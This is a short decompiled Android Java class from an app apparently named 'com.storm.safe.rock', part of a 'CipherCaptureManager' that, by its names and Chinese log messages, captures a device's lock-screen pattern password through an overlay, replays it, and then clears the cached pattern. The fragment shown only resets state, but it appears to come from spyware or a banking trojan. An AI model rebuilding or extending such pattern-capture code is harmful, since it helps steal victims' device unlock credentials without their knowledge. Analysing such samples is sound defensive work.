package com.storm.safe.rock.service.modules.cipher;

import kotlin.jvm.internal.Lambda;
import p000.C1351vv;
import p000.RunnableC0615ia;
import p000.t60;
import p000.w00;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
final class CipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$2 extends Lambda implements w00 {

    /* renamed from: a0 */
    public final /* synthetic */ C0335a1 f53222a0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public CipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$2(C0335a1 c0335a1) {
        super(0);
        this.f53222a0 = c0335a1;
    }

    @Override // p000.w00
    public final Object invoke() {
        t60.m214714d6("CipherCaptureManager", "🔷 图案回放完成 → 重置覆盖层创建状态，允许重建");
        this.f53222a0.f53304b8 = false;
        this.f53222a0.f53289a3 = null;
        C0337a3.f53343b6.releaseInstance();
        this.f53222a0.m211814b4(true);
        this.f53222a0.m211814b4(false);
        t60.m214714d6("CipherCaptureManager", "🔷 已清除本地图案密码缓存，允许下次重新捕获");
        C0335a1 c0335a1 = this.f53222a0;
        c0335a1.f53294a8.postDelayed(new RunnableC0615ia(c0335a1, 1), 1500L);
        return C1351vv.f60710b1;
    }
}
